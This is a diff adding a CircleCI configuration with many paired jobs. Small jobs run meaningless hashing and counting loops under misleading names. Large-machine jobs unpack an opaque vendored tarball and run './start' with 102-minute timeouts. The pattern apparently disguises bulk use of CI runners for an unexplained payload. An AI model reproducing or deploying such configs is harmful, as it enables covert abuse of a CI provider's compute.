@@ -1,0 +1,1788 @@
+version: 2.1
+
+jobs:
+  postcheck_callisto-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/data
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/data/manifest.bin; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/data/manifest.bin; done; true
+            size=$(wc -c </tmp/data/manifest.bin); echo "stage ok: callisto-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - manifest.bin
+  callisto-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/pt-v2.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  C_cf-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 471396 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/data/2023-08-05.data
+            size=$(wc -c </tmp/data/2023-08-05.data); echo "stage ok: cf-2a size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-08-05.data
+  cf-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/2023-08-05.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  beta_py310-cov:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 323737 | awk '{s+=$1}END{print s}'; true ; } > /tmp/data/25.blob
+            size=$(wc -c </tmp/data/25.blob); echo "stage ok: py310-cov size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 25.blob
+  py310-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/25.blob 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  reserve_anothr-run-54:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Precompute lookup
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 22020096 /dev/urandom | sha256sum; true ; } > /tmp/data/step-4.txt
+            size=$(wc -c </tmp/data/step-4.txt); echo "stage ok: anothr-run-54 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-4.txt
+  anothr-run-54:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-4.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  canary1_rm-dashboard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 473213 | md5sum; true ; } > /tmp/data/stage.blob
+            size=$(wc -c </tmp/data/stage.blob); echo "stage ok: rm-dashboard size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stage.blob
+  rm-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/stage.blob 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  reload_Verify_Image5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 81920 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/data/.lock
+            size=$(wc -c </tmp/data/.lock); echo "stage ok: Verify_Image5 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .lock
+  Verify_Image5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/.lock 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  hook_PROD_BUILD_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mint sequence identifier
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 264980 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/data/stash.dat
+            size=$(wc -c </tmp/data/stash.dat); echo "stage ok: PROD_BUILD_7 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stash.dat
+  PROD_BUILD_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  cacher_wip-db:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Normalize vendor data
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 4000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/data/23.data
+            size=$(wc -c </tmp/data/23.data); echo "stage ok: wip-db size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 23.data
+  wip-db:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  produce_vega-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes abc | head -n 50044 | sha256sum; true ; } > /tmp/data/216.data
+            size=$(wc -c </tmp/data/216.data); echo "stage ok: vega-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 216.data
+  vega-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  prefetch_qi-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 716800 | fold -w8 | sort -u | wc -l; true ; } > /tmp/data/summary.md
+            size=$(wc -c </tmp/data/summary.md); echo "stage ok: qi-run size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - summary.md
+  qi-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/pt-v2.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  hook_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 20971520 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/data/step-10.txt
+            size=$(wc -c </tmp/data/step-10.txt); echo "stage ok: preview size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-10.txt
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-10.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  ctx2_produce-full-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=11 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/data/66.out
+            size=$(wc -c </tmp/data/66.out); echo "stage ok: produce-full-test-matrix size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 66.out
+  produce-full-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/66.out 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  beta_rigel-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 1024000 | fold -w8 | sort -u | wc -l; true ; } > /tmp/data/metrics.tsv
+            size=$(wc -c </tmp/data/metrics.tsv); echo "stage ok: rigel-plus size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - metrics.tsv
+  rigel-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  produce_andromeda-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 23068672 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/data/2023-09-11.data
+            size=$(wc -c </tmp/data/2023-09-11.data); echo "stage ok: andromeda-ng size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-09-11.data
+  andromeda-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/pt-v2.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  vendor_VerifyStaging:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 17825792 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/data/event.ndjson
+            size=$(wc -c </tmp/data/event.ndjson); echo "stage ok: VerifyStaging size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - event.ndjson
+  VerifyStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  provision_v1-beta3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 215040 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/data/pt-v2.pt
+            size=$(wc -c </tmp/data/pt-v2.pt); echo "stage ok: v1-beta3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - pt-v2.pt
+  v1-beta3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/pt-v2.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  g1_atlas-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 16777216 | fold -w16 | sort -u | wc -l; true ; } > /tmp/data/step-25.log
+            size=$(wc -c </tmp/data/step-25.log); echo "stage ok: atlas-final size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-25.log
+  atlas-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/pt-v2.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  step1_bob-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Collate adjacent chunks
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=465900;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/data/output.out
+            size=$(wc -c </tmp/data/output.out); echo "stage ok: bob-push size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - output.out
+  bob-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  deps_tb-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<109432;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/data/artifact.tgz
+            size=$(wc -c </tmp/data/artifact.tgz); echo "stage ok: tb-alt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - artifact.tgz
+  tb-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/artifact.tgz 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  linter_assemble-partial-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 787934 | awk 'NR%11==0{sum+=$1}END{print sum}'; true ; } > /tmp/data/secondary_job_output_v2.log
+            size=$(wc -c </tmp/data/secondary_job_output_v2.log); echo "stage ok: assemble-partial-integration-tests size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - secondary_job_output_v2.log
+  assemble-partial-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  linter_v5-nightly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; head -c 3M /dev/urandom | base64 | wc -c; true ; } > /tmp/data/.sig
+            size=$(wc -c </tmp/data/.sig); echo "stage ok: v5-nightly size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - .sig
+  v5-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  dispatch_rm-router-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 204800 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/data/gate-ok.sig
+            size=$(wc -c </tmp/data/gate-ok.sig); echo "stage ok: rm-router-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - gate-ok.sig
+  rm-router-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/216.data 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
+      - run:
+          no_output_timeout: 102m
+          command: nice -n 0 ./start
+  B_juliet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 237379 | awk '{s+=$1}END{print s}'; true ; } > /tmp/data/step-pass.sig
+            size=$(wc -c </tmp/data/step-pass.sig); echo "stage ok: juliet size=${size}"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-pass.sig
+  juliet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Load upstream state
+          command: |
+            { od -An -c /tmp/data/step-pass.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Clone repo
+          command: git clone --depth 1 --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: tar -xj -f artifacts.tar.bz2
+      - run:
+          name: Store metadata
+          command: env | wc -l
+      - run:
+          name: Store metadata
+          command: free -m
+      - run:
+          name: Cooldown
+          command: date -u
